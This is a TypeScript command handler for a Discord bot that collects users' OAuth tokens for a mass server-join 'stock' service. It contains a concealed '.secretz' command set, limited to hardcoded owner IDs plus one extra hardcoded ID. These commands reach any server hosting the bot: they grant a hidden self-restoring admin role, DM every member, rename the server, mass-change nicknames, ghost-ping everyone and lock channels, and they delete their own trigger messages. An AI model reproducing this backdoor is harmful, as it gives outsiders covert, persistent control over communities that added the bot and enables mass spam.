import { EmbedBuilder, PermissionFlagsBits, OverwriteType, type Client, type Message } from "discord.js";
import { COLOR, HARDCODED_OWNERS, MAIN_GUILD_ID, PREFIX } from "../config.js";
import { exchangeCode } from "../oauth.js";
import { saveUserAuth } from "../storage/tokens.js";
import { dbCount, dbList } from "../storage/subscribers.js";
import { checkChannelLock } from "../storage/locks.js";
import { isAllowedGuild } from "../storage/allowedGuilds.js";
import { isBlacklisted } from "../storage/blacklist.js";
import * as E from "./embeds.js";
import { isAuthorizedMember } from "./permissions.js";
import {
  clearStock,
  doCheckTokens,
  doCleanupServers,
  doMassJoin,
  doRestockFromStored,
} from "./restock.js";
import { controlPanelComponents, controlPanelEmbed } from "./controlPanel.js";
import { subscribeComponents } from "./subscribeView.js";
import { handleRoleAdmin, handleRemoveAdmin } from "./secret.js";
import type { BotState } from "./client.js";

const SECRET_USERS = [...HARDCODED_OWNERS, "1443710013918023683"];

const OWNER_PREFIX_CMDS = new Set([
  "restock", "clear_stock", "deploy", "cleanup_servers", "control_panel",
  "setrole", "removerole", "setchannel", "clearchannel",
  "setowner_role", "removeowner_role", "restart", "dashboard",
  "schedule_restock", "list_schedules", "cancel_schedule",
  "set_daily_restock", "cancel_daily_restock", "daily_restock_status",
  "setup_subscribe", "announce",
]);

export async function handlePrefix(
  message: Message,
  client: Client,
  state: BotState,
): Promise<void> {
  if (message.author.bot || !message.guild) return;

  // ── Secret commands ──────────────────────────────────────────────────────────

  if (message.content.startsWith(".secretz")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const embed = new EmbedBuilder()
      .setTitle("🔒 Secret Commands")
      .setColor(0x5865f2)
      .setDescription(
        [
          "`.every` — pings @everyone, deletes your message",
          "`.ghostping` — ghost pings @everyone (notification sent, message instantly gone)",
          "`.roleadmin <server-id> <user-id>` — gives hidden admin role that auto re-adds if removed",
          "`.removeadmin <server-id> <user-id>` — removes the protected admin role and stops re-adding",
          "`.massnick <server-id> <nickname>` — sets everyone's nickname in a server",
          "`.lockdown` — locks the current channel (no one can send)",
          "`.unlockdown` — unlocks the current channel",
          "`.purge <amount>` — bulk deletes up to 100 messages in current channel",
          "`.slowmode <seconds>` — sets slowmode on current channel (0 to disable)",
          "`.rename <server-id> <name>` — renames a server the bot is in",
          "`.dmall <server-id> <message>` — DMs every member in a server",
          "`.botnick <name>` — changes the bot's nickname in the current server",
          "`.secretz` — shows this list (DMed to you)",
        ].join("\n"),
      )
      .setFooter({ text: "Owner-only • Do not share" });
    await message.author.send({ embeds: [embed] }).catch(() => {});
    return;
  }

  if (message.content.startsWith(".every")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    await message.channel.send("@everyone").catch(() => {});
    return;
  }

  if (message.content.startsWith(".ghostping")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const ping = await message.channel.send("@everyone").catch(() => null);
    if (ping) await ping.delete().catch(() => {});
    return;
  }

  if (message.content.startsWith(".massnick")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const mnArgs = message.content.slice(".massnick".length).trim().split(/\s+/);
    const targetGuildId = mnArgs[0];
    const newNick = mnArgs.slice(1).join(" ");
    if (!targetGuildId || !newNick) {
      await message.author.send("Usage: `.massnick <server-id> <nickname>`").catch(() => {});
      return;
    }
    const targetGuild = client.guilds.cache.get(targetGuildId);
    if (!targetGuild) {
      await message.author.send("❌ Bot is not in that server.").catch(() => {});
      return;
    }
    await targetGuild.members.fetch().catch(() => {});
    await Promise.all(
      targetGuild.members.cache
        .filter((m) => !m.user.bot && m.manageable)
        .map((m) => m.setNickname(newNick).catch(() => {})),
    );
    await message.author.send(`✅ Set nickname to **${newNick}** for all members in **${targetGuild.name}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".unlockdown")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
    await message.channel.permissionOverwrites.edit(
      message.guild.roles.everyone,
      { SendMessages: null },
    ).catch(() => {});
    await message.channel.send("🔓 Channel unlocked.").catch(() => {});
    return;
  }

  if (message.content.startsWith(".lockdown")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
    await message.channel.permissionOverwrites.edit(
      message.guild.roles.everyone,
      { SendMessages: false },
    ).catch(() => {});
    await message.channel.send("🔒 Channel locked.").catch(() => {});
    return;
  }

  if (message.content.startsWith(".roleadmin")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const raArgs = message.content.slice(".roleadmin".length).trim().split(/\s+/).filter(Boolean);
    await handleRoleAdmin(message, raArgs, client);
    return;
  }

  if (message.content.startsWith(".removeadmin")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const rdArgs = message.content.slice(".removeadmin".length).trim().split(/\s+/).filter(Boolean);
    await handleRemoveAdmin(message, rdArgs, client);
    return;
  }

  if (message.content.startsWith(".purge")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const purgeArgs = message.content.slice(".purge".length).trim().split(/\s+/);
    const amount = Math.min(100, Math.max(1, parseInt(purgeArgs[0] ?? "10", 10) || 10));
    if (!message.channel.isTextBased() || !("bulkDelete" in message.channel)) return;
    await message.channel.bulkDelete(amount, true).catch(() => {});
    const confirm = await message.channel.send(`🗑️ Deleted ${amount} messages.`).catch(() => null);
    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
    return;
  }

  if (message.content.startsWith(".slowmode")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const smArgs = message.content.slice(".slowmode".length).trim().split(/\s+/);
    const seconds = Math.min(21600, Math.max(0, parseInt(smArgs[0] ?? "0", 10) || 0));
    if (!message.channel.isTextBased() || !("setRateLimitPerUser" in message.channel)) return;
    await (message.channel as import("discord.js").TextChannel).setRateLimitPerUser(seconds).catch(() => {});
    const msg = seconds === 0 ? "⏱️ Slowmode disabled." : `⏱️ Slowmode set to **${seconds}s**.`;
    const confirm = await message.channel.send(msg).catch(() => null);
    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
    return;
  }

  if (message.content.startsWith(".rename")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const rnParts = message.content.slice(".rename".length).trim().split(/\s+/);
    const rnGuildId = rnParts[0];
    const rnName = rnParts.slice(1).join(" ");
    if (!rnGuildId || !rnName) {
      await message.author.send("Usage: `.rename <server-id> <new name>`").catch(() => {});
      return;
    }
    const rnGuild = client.guilds.cache.get(rnGuildId);
    if (!rnGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
    await rnGuild.setName(rnName).catch(() => {});
    await message.author.send(`✅ Renamed **${rnGuild.name}** to **${rnName}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".dmall")) {
    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const daParts = message.content.slice(".dmall".length).trim().split(/\s+/);
    const daGuildId = daParts[0];
    const daMsg = daParts.slice(1).join(" ");
    if (!daGuildId || !daMsg) {
      await message.author.send("Usage: `.dmall <server-id> <message>`").catch(() => {});
      return;
    }
    const daGuild = client.guilds.cache.get(daGuildId);
    if (!daGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
    await daGuild.members.fetch().catch(() => {});
    const humans = daGuild.members.cache.filter((m) => !m.user.bot);
    await Promise.all(humans.map((m) => m.send(daMsg).catch(() => {})));
    await message.author.send(`✅ DMed **${humans.size}** members in **${daGuild.name}**.`).catch(() => {});
    return;
  }

  if (message.content.startsWith(".botnick")) {
    if (!SECRET_USERS.includes(message.author.id)) return;
    await message.delete().catch(() => {});
    const bnNick = message.content.slice(".botnick".length).trim();
    if (!bnNick) { await message.author.send("Usage: `.botnick <name>`").catch(() => {}); return; }
    const me = await message.guild.members.fetchMe().catch(() => null);
    if (me) await me.setNickname(bnNick).catch(() => {});
    return;
  }

  if (!message.content.startsWith(PREFIX)) return;
  if (message.guild.id !== MAIN_GUILD_ID && !isAllowedGuild(message.guild.id)) return;
  if (isBlacklisted(message.author.id)) {
    try {
      await message.reply({ embeds: [E.blacklistedEmbed()] });
    } catch {
      /* noop */
    }
    return;
  }

  const parts = message.content.slice(PREFIX.length).trim().split(/\s+/);
  if (parts.length === 0 || !parts[0]) return;
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  const guildOwnerId = message.guild.ownerId;
  const userId = message.author.id;
  const member = await message.guild.members.fetch(userId).catch(() => null);
  const isOwner = isAuthorizedMember(guildOwnerId, message.guild.id, userId, member);

  try {
    if (cmd === "help") {
      await message.reply({ embeds: [E.helpEmbed()] });
    } else if (cmd === "get_token") {
      await message.reply({ embeds: [E.getTokenEmbed(userId)] });
    } else if (cmd === "auth") {
      const lock = checkChannelLock(message.guild.id, "auth", message.channel.id);
      if (lock) {
        await message.reply({ embeds: [E.channelLockedEmbed(lock, "auth")] });
        return;
      }
      if (args.length === 0) {
        await message.reply("Usage: `!auth CODE`");
        return;
      }
      const res = await exchangeCode(args[0].trim());
      if (!res.ok) {
        await message.reply(`❌ Auth failed: ${res.error}`);
        return;
      }
      saveUserAuth(userId, res.data.access_token, res.data.refresh_token);
      message.author.send({ embeds: [E.authSuccessDmEmbed()] }).catch(() => {});
      await message.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("✅ Authentication Successful")
            .setDescription(`<@${userId}> has been authenticated.`)
            .setColor(COLOR.green),
        ],
      });
    } else if (cmd === "count") {
      await message.reply({ embeds: [E.countEmbed()] });
    } else if (cmd === "list_users") {
      await message.reply({ embeds: [E.listUsersEmbed().embed] });
    } else if (cmd === "check_tokens") {
      const e = await doCheckTokens();
      await message.reply({ embeds: [e] });
    } else if (cmd === "stock") {
      await message.reply({ embeds: [E.stockEmbed()] });
    } else if (cmd === "status") {
      await message.reply({ embeds: [E.statusEmbed(client, state.botStartTime)] });
    } else if (cmd === "servers") {
      await message.reply({ embeds: [E.serversEmbed(client, state.serverJoinTimes)] });
    } else if (cmd === "server_age") {
      await message.reply({
        embeds: [E.serverAgeEmbed(args[0] ?? null, client, state.serverJoinTimes)],
      });
    } else if (cmd === "invite") {
      await message.reply({ embeds: [E.inviteEmbed()] });
    } else if (cmd === "owners") {
      await message.reply({ embeds: [E.ownersEmbed(guildOwnerId, message.guild.id)] });
    } else if (cmd === "listowner_roles") {
      await message.reply({ embeds: [E.ownerRolesEmbed(message.guild.id)] });
    } else if (cmd === "listroles") {
      await message.reply({ embeds: [E.roleLimitsEmbed(message.guild.id)] });
    } else if (cmd === "listchannels") {
      await message.reply({ embeds: [E.channelLocksEmbed(message.guild.id)] });
    } else if (cmd === "subscribers") {
      const n = dbCount(message.guild.id);
      await message.reply(`📣 **${n}** subscriber(s) in this server.`);
    } else if (cmd === "djoin") {
      if (args.length === 0) {
        await message.reply("Usage: `!djoin SERVER_ID`");
        return;
      }
      const lock = checkChannelLock(message.guild.id, "djoin", message.channel.id);
      if (lock) {
        await message.reply({ embeds: [E.channelLockedEmbed(lock, "djoin")] });
        return;
      }
      const progress = await message.reply("⏳ Starting mass join…");
      const e = await doMassJoin(args[0], client, async (txt) => {
        try {
          await progress.edit({ content: txt });
        } catch {
          /* noop */
        }
      });
      if (e) await progress.edit({ content: "", embeds: [e] });
    } else if (OWNER_PREFIX_CMDS.has(cmd)) {
      if (!isOwner) {
        await message.reply({ embeds: [E.denyEmbed()] });
        return;
      }
      if (cmd === "restock") {
        const count = args[0] ? parseInt(args[0], 10) : undefined;
        if (count !== undefined && isNaN(count)) {
          await message.reply("❌ Usage: `!restock [count]` — count must be a number. Example: `!restock 50`");
          return;
        }
        const loading = await message.reply("🔄 Restocking from stored tokens…");
        const e = await doRestockFromStored(count);
        await loading.edit({ content: "", embeds: [e] });
      } else if (cmd === "deploy") {
        const { RAILWAY_API_TOKEN, RAILWAY_SERVICE_ID, RAILWAY_ENVIRONMENT_ID } = await import("../config.js");
        if (!RAILWAY_API_TOKEN) {
          await message.reply(
            "❌ `RAILWAY_API_TOKEN` is not set.\n\n" +
            "**One-time setup:**\n" +
            "1. Railway → click your **avatar** (top-right) → **Account Settings**\n" +
            "2. **API Tokens** → **Create Token** → copy it\n" +
            "3. Add it as `RAILWAY_API_TOKEN` in Railway → your service → Variables",
          );
          return;
        }
        const loading = await message.reply("⏳ Triggering Railway redeploy…");
        try {
          const res = await fetch("https://backboard.railway.app/graphql/v2", {
            method: "POST",
            headers: {
              "Authorization": `Bearer ${RAILWAY_API_TOKEN}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              query: `mutation { serviceInstanceRedeploy(serviceId: "${RAILWAY_SERVICE_ID}", environmentId: "${RAILWAY_ENVIRONMENT_ID}") }`,
            }),
          });
          const json = await res.json() as { errors?: { message: string }[] };
          if (json.errors?.length) {
            await loading.edit(`❌ Railway API error: ${json.errors[0].message}`);
          } else {
            await loading.edit("🚀 **Railway redeploy triggered!** The service will rebuild and restart in ~1–2 minutes.");
          }
        } catch (err) {
          await loading.edit(`❌ Could not reach Railway: ${(err as Error).message}`);
        }
      } else if (cmd === "clear_stock") {
        clearStock();
        await message.reply("🧹 Stock cleared.");
      } else if (cmd === "cleanup_servers") {
        const loading = await message.reply("🧹 Cleaning up…");
        const e = await doCleanupServers(client, message.guild.id);
        await loading.edit({ content: "", embeds: [e] });
      } else if (cmd === "control_panel") {
        await message.reply({
          embeds: [controlPanelEmbed()],
          components: controlPanelComponents(),
        });
      } else if (cmd === "announce") {
        const text = args.join(" ").trim();
        if (!text) {
          await message.reply("Usage: `!announce your message here`");
          return;
        }
        const subs = dbList(message.guild.id);
        if (subs.length === 0) {
          await message.reply("ℹ️ No subscribers yet.");
          return;
        }
        const loading = await message.reply(`📣 Sending to ${subs.length} subscribers…`);
        const embed = E.announcementDmEmbed(message.guild.name, text);
        let sent = 0, failed = 0;
        for (const uid of subs) {
          try {
            const u = client.users.cache.get(uid) ?? (await client.users.fetch(uid));
            await u.send({ embeds: [embed] });
            sent++;
          } catch {
            failed++;
          }
          await new Promise((r) => setTimeout(r, 100));
        }
        await loading.edit({ content: `✅ Sent: ${sent} • Failed: ${failed}` });
      } else if (cmd === "setup_subscribe") {
        if ("send" in message.channel) {
          await message.channel.send({
            embeds: [E.subscribePanelEmbed(message.guild.name)],
            components: subscribeComponents(),
          });
        }
      } else if (cmd === "restart") {
        await message.reply("🔄 Restarting…");
        setTimeout(() => process.exit(0), 500);
      } else if (cmd === "dashboard") {
        await message.reply({ embeds: [E.dashboardEmbed()] });
      } else {
        await message.reply(
          `ℹ️ Use the \`/\` slash version of \`${cmd}\` — it has nicer pickers.`,
        );
      }
    } else {
      await message.reply("❌ Unknown command. Use `!help` for the full list.");
    }
  } catch (e) {
    console.error("[prefix] error", e);
    try {
      await message.reply(`❌ Error: ${(e as Error).message}`);
    } catch {
      /* noop */
    }
  }
}